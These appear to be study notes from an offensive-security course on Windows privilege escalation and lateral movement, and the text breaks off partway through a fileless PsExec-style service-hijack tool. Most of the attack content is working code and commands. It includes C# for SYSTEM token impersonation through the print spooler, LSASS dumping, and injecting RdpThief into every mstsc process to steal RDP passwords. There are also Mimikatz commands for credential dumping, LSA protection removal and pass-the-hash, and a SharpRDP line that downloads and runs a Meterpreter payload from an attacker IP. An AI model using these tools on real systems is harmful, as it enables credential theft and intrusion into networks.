- Applications executing in the context of a regular user run at medium integrity, and administrators can execute applications at high integrity.

- System is typically only used for SYSTEM services.

It's not possible for a process of a certain integrity level to modify a process of higher integrity level but the opposite is possible.

Local administrators receive 2 access tokens when authenticating.

1. (which is used by default) is configured to create processes as medium integrity.

2. When a user selects the "Run as administrator" option for an application, elevated token is used instead, and allows the process to run at high integrity.

The User Account Control (UAC) mechanism links these two tokens to a single user and creates the consent prompt.

Privileges are also included in the access token. They are a set of predefined operating system access rights that govern which actions a process can perform.

View the available privileges for the current user

```bat
whoami /priv
```

The **SeShutdownPrivilege** privilege allows the user to reboot or shutdown the computer.

It is possible to add additional privileges that will take effect after the targeted user account **logs out and logs back in**. This can be done with the Win32 LsaAddAccountRights API, but more often be performed through a **group policy** or locally through an application like `secpol.msc`.

**SeLoadDriverPrivilege** yields the permission to load a kernel driver.

2 types of access tokens.

Each process has a **primary access token** that originates from the user's token created during authentication.

An **impersonation token** can be created that allows a user to act on behalf of another user without that user's credentials.

Impersonation tokens have four levels: Anonymous, Identification, Impersonation, and Delegation.

- Anonymous and Identification only allow enumeration of information.

- Impersonation allows impersonation of the client's identity.

- Delegation makes it possible to perform sequential access control checks across multiple machines.

E.g., a user authenticates to a web server and performs an action on that server that requires a database lookup. The web service could use delegation to pass authentication to the database server "through" the web server.

### Elevation with Impersonation

9 different privileges that may allow for privilege escalation from medium integrity to either high integrity or system integrity, or enable compromise of processes running as another authenticated user.

**SeImpersonatePrivilege** allows us to impersonate any token for which we can get a reference, or handle.

The built-in **Network Service** account, the **LocalService** account, and the **default IIS account** have it assigned by default.

=> Gaining code execution on a **web server**

When no tokens related to other user accounts are available in memory, we can likely force the **SYSTEM** account to give us a token that we can impersonate.

Pipes are a means of interprocess communication (IPC), just like RPC, COM, or even network sockets. A pipe is a section of shared memory inside the kernel that processes can use for communication.

One process can create a pipe (the pipe server) while other processes can connect to the pipe (pipe clients) and read/write information from/to it, depending on the configured access rights for a given pipe.

Anonymous pipes are typically used for communication between parent and child processes, while **named pipes** have more functionality and support impersonation.

Force the SYSTEM account to connect to a named pipe set up by an attacker. The technique was originally developed as part of an AD attack, it can also be used locally.

It is based on the **print spooler service**, which is started by default and runs in a **SYSTEM** context.

The print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes.

Create a process running with the **SeImpersonatePrivilege** privilege that simulates a print client to obtain a SYSTEM token that we can impersonate.

Create a C# application that creates a pipe server (i.e. a "print client"), waits for a connection, and attempts to impersonate the client that connects to it.

```csharp
using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            ConnectNamedPipe(hPipe, IntPtr.Zero);

            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
        }
    }
}
```

Use the Win32 CreateNamedPipe, ConnectNamedPipe, and ImpersonateNamedPipeClient APIs.

The **ImpersonateNamedPipeClient** API allows impersonation of the token from the account that connects to the pipe if the server has SeImpersonatePrivilege. When ImpersonateNamedPipeClient is called, the calling thread will use the impersonated token instead of its default token.

CreateNamedPipe creates a pipe. This API accepts these arguments:

1. The pipe name (lpName). All named pipes must have a standardized name format (such as \\.\pipe\pipename) and must be unique on the system.

2. dwOpenMode describes the mode the pipe is opened in. Specify a bi-directional pipe with the PIPE_ACCESS_DUPLEX enum using its numerical equivalent of "3".

3. dwPipeMode describes the mode the pipe operates in. Specify PIPE_TYPE_BYTE to directly write and read bytes along with PIPE_WAIT to enable blocking mode. => to listen on the pipe until it receives a connection. Specify the combination of these two modes with the numerical value "0".

4. The maximum number of instances for the pipe is specified through nMaxInstances. This is primarily used to ensure efficiency in larger applications, and any value between 1 and 255 works.

5. nOutBufferSize and nInBufferSize define the number of bytes to use for the input and output buffer. We'll choose one memory page (0x1000 bytes).

6. The second-to-last argument defines the default time-out value that is used with the WaitNamedPipe API. Since we are using a blocking named pipe, we don't care about this and can choose the default value of 0.

7. The last argument, we must submit a SID detailing which clients can interact with the pipe. We'll set this to NULL to allow the SYSTEM and local administrators to access it.

**ConnectNamedPipe**'s argument:

1. hNamedPipe is a handle to the pipe that is returned by CreateNamedPipe

2. lpOverlapped is a pointer to a structure used in more advanced cases. Set this to NULL.

After we have called ConnectNamedPipe, the application will wait for any incoming pipe client. Once a connection is made, call ImpersonateNamedPipeClient to impersonate the client.

ImpersonateNamedPipeClient accepts the pipe handle as its only argument.

At this point, our code will start a pipe server, listen for incoming connections, and impersonate them.

If everything works correctly, ImpersonateNamedPipeClient will assign the impersonated token to the current thread.

To verify the success of our attack, open the impersonated token with OpenThreadToken and then use GetTokenInformation to obtain the SID associated with the token. Finally, call ConvertSidToStringSid to convert the SID to a readable SID string.

**OpenThreadToken**'s arguments:

1. A handle to the thread (ThreadHandle) associated with this token. Since the thread in question is the current thread, use the Win32 GetCurrentThread API, which simply returns the handle.

2. The level of access (DesiredAccess) we want to the token. To avoid any issues, we'll ask for all permissions (TOKEN_ALL_ACCESS) with its numerical value of 0xF01FF.

3. OpenAsSelf specifies whether the API should use the security context of the process or the thread. Since we want to use the impersonated token, set this to false.

4. A pointer (TokenHandle) will be populated with a handle to the token that is opened.

**GetTokenInformation** API can return a variety of information, but we'll simply request the SID:

1. TokenHandle is the token we obtained from OpenThreadToken

2. TokenInformationClass specifies the type of information we want to obtain. Since we simply want the SID, we can pass TokenUser, which has the numerical value of "1", for the TOKEN_INFORMATION_CLASS argument.

3. TokenInformation is a pointer to the output buffer that will be populated by the API

4. TokenInformationLength is the size of the output buffer. Since we don't know the required size of the buffer, call this API twice. The first time, we set these two arguments values to NULL and 0 respectively and then ReturnLength will be populated with the required size. After this, we can allocate an appropriate buffer and call the API a second time. 

To allocate the TokenInformation buffer, use the .NET Marshal.AllocHGlobal method, which can allocate unmanaged memory.

Use ConvertSidToStringSid to convert the binary SID to a SID string that we can read.

1. Sid is a pointer to the SID. The SID is in the output buffer that was populated by GetTokenInformation, but we must extract it first.
One way to do this is to define the TOKEN_USER structure (which is part of the TOKEN_INFORMATION_CLASS used by GetTokenInformation) and then marshal a pointer to it with Marshal.PtrToStructure.

2. For *StringSid, supply the output string. Supply an empty pointer and once it gets populated, marshal it to a C# string with Marshal.PtrToStringAuto.

```bat
psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
```

```bat
whoami
whoami /priv
```

Compile our assembled code, execute it and supply a random pipe name:

```bat
PrintSpooferNet.exe \\.\pipe\test
```

To simulate a connection, open an elevated command prompt and write to the pipe

```bat
echo hello > \\localhost\pipe\test
```

When we switch back to the command prompt running our application, we find that a SID has been printed.

Our code has impersonated a token and resolved the associated SID.

To verify that this SID belongs to the administrator account, we can switch back to the elevated command prompt and dump it

```bat
whoami /user
```

=> We can impersonate anyone who connects to our named pipe.

The pipe name used by the print spooler service is `\pipe\spoolss`.

Use the **SpoolSample** C# implementation or the PowerShell code (https://github.com/vletoux/SpoolerScanner).

When we use SpoolSample, specify the name of the server to connect to (the victim) and the name of the server we control (the attacker), also called the capture server.

Since we are performing the attack locally, both servers are the same. => a challenge.

The print spooler service (running as SYSTEM on the victim) needs to contact the simulated print client (through our pipe) but since they are on the same host, they in effect require the same default pipe name (`pipe\spoolss`).`

Before attempting to access the client pipe, the print spooler service validates the pipe path, making sure it matches the default name "`pipe\spoolss`". 

Unfortunately, as mentioned before, we cannot specify "spoolss" as a name since it is already in use by the print spooler service we are targeting.

What happens when a file path is supplied to a Win32 API?

When directory separators are used as a part of the file path, they are converted to canonical form. Forward slashes ("/") will be converted to backward slashes ("\") => **file path normalization**.

If we provide SpoolSample with an arbitrary pipe name containing a forward slash after the hostname ("`appsrv01/test`"), the spooler service will not interpret it correctly and it will append the default name "`pipe\spoolss`" to our own path before processing it. This effectively bypasses the path validation and the resulting path ("appsrv01/test\pipe\spoolss") is then normalized before the spooler service attempts to send a print object change notification message to the client.

This pipe name differs from the default one used by the print spooler service, and we can register it in order to simulate a print client.

```bat
SpoolSample.exe appsrv01 appsrv01/test
```

First, the path we supplied (`appsrv01/test`) has been switched to a canonical form (`appsrv01\test`) as part of the full path.

Second, `spoolsv.exe` attempted to access the named pipe `\\.\appsrv01\test\pipe\spoolss` while performing the callback. Since we have not created a pipe server by that name yet, the request failed.

Create a pipe server with that name and simulate a print client. When we execute SpoolSample, the print spooler service will connect to our pipe.

Launching our **PrintSpooferNet** application from a Network Service command prompt/a process that has the SeImpersonatePrivilege

```bat
PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
```

```bat
SpoolSample.exe appsrv01 appsrv01/pipe/test
```

=> A connection from the "`S-1-5-18`" SID. This SID value belongs to the SYSTEM account proving that our technique worked.

=> Take advantage of the impersonated token by **launching a new command prompt as SYSTEM**

The Win32 **CreateProcessWithTokenW** API can create a new process based on a token. The token must be a primary token, so we'll first use **DuplicateTokenEx** to convert the impersonation token to a primary token.

**DuplicateTokenEx**:

1. Supply the impersonation token by recovering it with **OpenThreadToken**. We'll request full access to the token with the numerical value 0xF01FF for the dwDesiredAccess argument. For the third argument (lpTokenAttributes), we'll use a default security descriptor for the new token by setting this to NULL.

2. ImpersonationLevel must be set to SecurityImpersonation, which is the access type we currently have to the token. This has a numerical value of "2". For the TokenType, we'll specify a primary token (TokenPrimary36) by setting this to "1".

3. The final argument (phNewToken) is a pointer that will be populated with the handle to the duplicated token.

With the token duplicated as a primary token, we can call **CreateProcessWithToken** to create a command prompt as SYSTEM.

1. Supply the newly duplicated token followed by a logon option, which we set to its default of 0.

2. For the lpApplicationName and lpCommandLine arguments, supply NULL and the full path of `cmd.exe`, respectively.

3. The creation flags (dwCreationFlags), environment block (lpEnvironment), and current directory (lpCurrentDirectory) arguments can be set to 0, NULL, and NULL respectively to select the default options.

4. For lpStartupInfo and lpProcessInformation, pass STARTUPINFO and PROCESS_INFORMATION structures, which are populated by the API during execution.

With this attack, we can elevate our privileges from an unprivileged account that has the SeImpersonatePrivilege to SYSTEM on any modern Windows system including Windows 2019 and the newest versions of Windows 10.

A C++ implementation that has the SpoolSample functionality embedded (https://github.com/itm4n/PrintSpoofer)

A similar technique that also uses pipes (https://windows-internals.com/faxing-your-way-to-system/). It impersonates the RPC system service (RpcSs), which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for **Network Service**.

On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through COM. It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, 

=> Release of the **RoguePotato** tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access. (https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

The **beans** technique based on local man-in-the-middle authentication with Windows Remote Management (WinRM) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default. (https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/)

### Fun with Incognito

Use the Meterpreter Incognito module to impersonate any logged in users and obtain code execution in their context without access to any passwords or hashes.

This access token attack vector does not rely on Mimikatz and may evade some detection software.

Meterpreter

List all currently used tokens by unique Username
Impersonate the admin user through the Win32 ImpersonateLoggedOnUser API

```
load incognito
help incognito
list_tokens -u
impersonate_token corp1\\admin
```

## Mimikatz

Launching Mimikatz from an elevated command prompt 

As administrator, the offsec user can use **SeDebugPrivilege** to read and modify a process under the ownership of a different user.

Dump all cached passwords and hashes from LSASS

```
privilege::debug
sekurlsa::logonpasswords
```

The wdigest authentication protocol requires a clear text password, but it is disabled in Windows 8.1 and newer.

We can enable it by creating the **UseLogonCredential** registry value in the path `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`. Once we set this value to "1", the clear text password will be cached in LSASS after subsequent logins.

Microsoft has developed mitigation techniques: **LSA Protection and Windows Defender Credential Guard**.

Windows divides its processes into 4 distinct integrity levels. An additional mitigation level, **Protected Processes Light (PPL)** was introduced, which can be layered on top of the current integrity level.

=> A process running at SYSTEM integrity cannot access or modify the memory space of a process executing at SYSTEM integrity with PPL enabled.

LSASS supports PPL protection, which can be enabled in the registry. This is done through the **RunAsPPL** DWORD value in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` with a value of 1.

This protection mechanism is disabled by default due to 3rd-party compatibility issues.

PPL protection is controlled by a bit residing in the **EPROCESS** kernel object associated with the target process. If we could obtain code execution in kernel space, disable the LSA protection  with `mimidrv.sys` driver.

We must be local administrator or SYSTEM to dump the credentials, => also have the **SeLoadDriverPrivilege** privilege and the ability to load any signed drivers.

Mimikatz can load the `mimidrv.sys` driver with the `!+` command. Once the driver is loaded, we can use it to disable the PPL protection for LSASS.

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

## Processing Credentials Offline

Create a dump file with **Task Manager**, which is a snapshot of a given process. This dump includes loaded libraries and application memory.

Navigate to the **Details** tab, locate the `lsass.exe` process, right-click it and choose **Create dump file**.

Once the dump file is created, we can copy it from the target to our local Windows client where we can parse it with Mimikatz.

When opening a dump file in Mimikatz, the target machine and the processing machine must have a **matching OS and architecture**.

E.g., if the dumped LSASS process was from a Windows 10 64-bit machine; we must also parse it on a Windows 10 or Windows 2016/2019 64-bit machine. 

However, processing the dump file requires **neither** an elevated command prompt nor `privilege::debug`.

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Task Manager cannot be run as a command line tool, => need GUI access to the target. Alternatively, we can create the dump file from the command line with **ProcDump** from SysInternals.

Develop our own C# application to execute a memory dump that we can parse with Mimikatz.

When Task Manager and ProcDump create a dump file, they are invoking the Win32 **MiniDumpWriteDump** API.

This function requires a lot of arguments, but only the first 4 are needed for our use case.

- The 1st 2 arguments (hProcess and ProcessId) must be a handle to LSASS and the process ID of LSASS, respectively.

- The 3rd argument (hFile) is a handle to the file that will contain the generated memory dump, and the fourth (DumpType) is an enumeration type that we'll set to MiniDumpWithFullMemory (or its numerical value of "2") to obtain a full memory dump.


```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;


namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
          int processId);

        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);

            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);

            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
```

`C:\Windows\tasks\lsass.dmp`

```bat
MiniDump.exe
```

```
sekurlsa::minidump C:\Windows\tasks\lsass.dmp
sekurlsa::logonpasswords
```

# Windows Lateral Movement

## Remote Desktop Protocol

Connecting to a workstation with Remote Desktop will disconnect any existing session.

The `/admin` flag allows us to connect to the admin session, which does not disconnect the current user if we perform the login with the same user.

```bat
mstsc.exe /v:appsrv01 /admin
```

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TerminalServer` --> look for **fSingleSessionPerUser**

fSingleSessionPerUser  === 1 --> Only one session per user
fSingleSessionPerUser  === 0 --> Multiple sessions per user


When an RDP connection is created, the NTLM hashes will reside in memory for the duration of the session. The session does not terminate without a proper logout => simply disconnecting from the sessions will leave the hashes in memory.

To prevent attackers from stealing credentials on a compromised server, Microsoft introduced RDP with **restricted admin mode**, which allows system administrators to perform a network login with RDP.

A network login does not require clear text credentials and will not store them in memory, essentially disabling single sign-on. This type of login is commonly used by service accounts.

We can use restricted admin mode by supplying the **/restrictedadmin** argument to `mstsc.exe`. When we supply this argument, the current login session is used to authenticate the session. Note that we do not enter a password for this transaction.

```bat
mstsc.exe /v:appsrv01 /restrictedadmin
```

Since we used restricted admin mode, no credentials have been cached, which helps mitigate credential theft.

Restricted admin mode is disabled by default but the setting can be controlled through the **DisableRestrictedAdmin** registry entry at the following path:
`HKLM:\System\CurrentControlSet\Control\Lsa`

While restricted admin mode protects against credential theft on the target, it is now possible to **pass the hash** when doing lateral movement with mstsc.

Assume that we are already in possession of the admin user NTLM hash. Use the pth command to launch a `mstsc.exe` process in the context of the admin user:

```
privilege::debug
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

Disable the restricted admin mode on our appsrv01 target.

```pwsh
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
```

When we click Connect, => error message which indicates that restricted admin mode is disabled.

To re-enable restricted admin mode, launch a local instance of PowerShell in the context of the admin user with Mimikatz.

```
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```

```pwsh
Enter-PSSession -Computer appsrv01
```

```pwsh
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

xfreerdp RDP client, which is installed on a Kali system by default, supports restricted remote admin connections as well.

```bash
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

## Reverse RDP Proxying with Metasploit

`multi/manage/autoroute` module allow us to configure a reverse tunnel through the Meterpreter session and use that with a SOCKS proxy.

```
use multi/manage/autoroute
set session 1
exploit

use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j
```

Use a local proxy application like Proxychains to force TCP traffic through a TOR or SOCKS proxy:

```bash
sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf' 
```

```bash
proxychains rdesktop 192.168.120.10
```

## Reverse RDP Proxying with Chisel

On Kali:

Start chisel in server mode, specify the listen port with -p and --socks5 to specify the SOCKS proxy mode.

```bash
./chisel server -p 8080 --socks5
```

Configure a SOCKS proxy server with the Kali SSH server.

Enable password authentication by uncommenting the appropriate line in the `sshd_config` file.

After the service is started, we'll connect to it with ssh and supply -N to ensure commands are not executed but merely forwarded and -D to configure a SOCKS proxy.

```bash
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo systemctl start ssh.service

ssh -N -D 0.0.0.0:1080 localhost
```

On Windows:

```bat
chisel.exe client 192.168.119.120:8080 socks
```

On Kali:

```bash
sudo proxychains rdesktop 192.168.120.10 
```

## RDP as a Console

Although RDP can also be used as a command-line tool.

The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll. This library exposes interfaces to both scripts and compiled code through COM objects.

**SharpRDP** is a C# application that uses uses the non-scriptable interfaces exposed by mstscax.dll to perform authentication in the same way as mstsc.exe.

Once authentication is performed, SharpRDP allows us to execute code through SendKeys.

```bat
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```

## Stealing Clear Text Credentials from RDP

When a user creates a Remote Desktop session with mstsc.exe, they enter clear text credentials into the application.

Analyze an application that can detect and dump these credentials from memory for us, effectively working as a more targeted keylogger.

This technique relies on the concept of **API hooking**.

As a basic theoretical example, let's imagine that we are able to hook the **WinExec** API, which can be used to start a new application.

- The first argument (lpCmdLine) is an input buffer that will contain the name of the application we want to launch.

If we are able to pause the execution flow of an application when the API is invoked (like a breakpoint in WinDbg), we could redirect the execution flow to custom code that writes a different application name into the input buffer. Continuing execution would trick the API into starting a different application than the one intended by the user.

Likewise, we could execute custom code that copies the content of the input buffer, return it to us, and continue execution unaltered.

Instead of pausing execution, we could overwrite the initial instructions of an API at the assembly level with code that transfers execution to any custom code we want.

The Microsoft-provided unmanaged **Detours** library makes this possible and would allow an attacker to leak information from any API.

Our goal is to leverage API hooking to steal the clear text credentials entered into mstsc when they are processed by relevant APIs.

MDSec discovered that the APIs responsible for handling the username, password, and domain are **CredIsMarshaledCredentialW**, **CryptProtectMemory**, and **SspiPrepareForCredRead** respectively.

=> release RdpThief, which uses Detours to hook these APIs.

The hooks in this tool will execute code that copies the username, password, and domain to a file. Finally, RdpThief allows the original code execution to continue as intended.

RdpThief is written as an unmanaged DLL and must be injected into an `mstsc.exe` process before the user enters the credentials.

Modify our injection code further to automatically detect when an instance of mstsc is started and then inject into it.

Implement this with an infinitely-running while loop. With each iteration of the loop, we'll discover all instances of mstsc.exe and subsequently perform an injection into each of them.

Use the Thread.Sleep method to pause for one second between each iteration.

`Inject.exe`

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

            // String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            // String dllName = dir + "\\RdpThief.dll";
            // WebClient wc = new WebClient();
            // wc.DownloadFile("http://192.168.119.120/RdpThief.dll", dllName);

            String dllName = "C:\\Tools\\RdpThief.dll";

            while (true)
            {
                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                if (mstscProc.Length > 0)
                {
                    for (int i = 0; i < mstscProc.Length; i++)
                    {
                        int pid = mstscProc[i].Id;

                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                        IntPtr outSize;
                        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                    }
                }

                Thread.Sleep(1000);
            }
        }
    }
}
```

Dump the contents of the RdpThief output file to find the clear text credentials.

```bat
type C:\Users\<User>\AppData\Local\Temp\data.bin
```

```bat
Inject.exe
mstsc.exe
```

## Fileless Lateral Movement

At a high level, PsExec authenticates to SMB on the target host and accesses the DCE/RPC interface. PsExec will use this interface to access the service control manager, create a new service, and execute it.

The binary that is executed by the service is copied to the target host.

=> Implement a variant of PsExec that neither writes a file to disk nor creates an additional service to obtain code execution

Authentication to the DCE/RPC interface and the service control manager is handled by the unmanaged **OpenSCManagerW** API.

To invoke OpenSCManagerW, we must supply the hostname of the target (lpMachineName) and the name of the database for the service control database (lpDatabaseName). Supplying a null value will use the default database.

Finally, we must pass the desired access (dwDesiredAccess) to the service control manager. The API is executed in the context of the access token of the executing thread, which means no password is required.

If authentication is successful, a handle is returned that is used to interact with the service control manager.

PsExec performs the same actions when invoked, but then it calls **CreateServiceA** to set up a new service.

We will instead use the **OpenService** API to open an existing service and invoke **ChangeServiceConfigA** to **change the binary that the service executes**.

=> will not leave any service creation notifications and may evade detection.

Once the service binary has been updated, we will issue a call to **StartServiceA**, which will execute the service binary and give us code execution on the remote machine.

Since we control the service binary, we can use a PowerShell download cradle to avoid saving a file to disk.

If endpoint protections such as application whitelisting are in place, this approach may not be as straightforward and may require a bypass (such as the use of InstallUtil or an XSL transform).

Since the OpenSCManagerW authentication API executes in the context of the access token of the thread, it is very easy to pass the hash with this technique as well. We could simply use Mimikatz to launch the application with the `sekurlsa::pth` command.

```csharp
using System;
using System.Runtime.InteropServices;

namespace lat
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);


        static void Main(string[] args)
        {
            String target = "appsrv01";

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            string ServiceName = "SensorService";
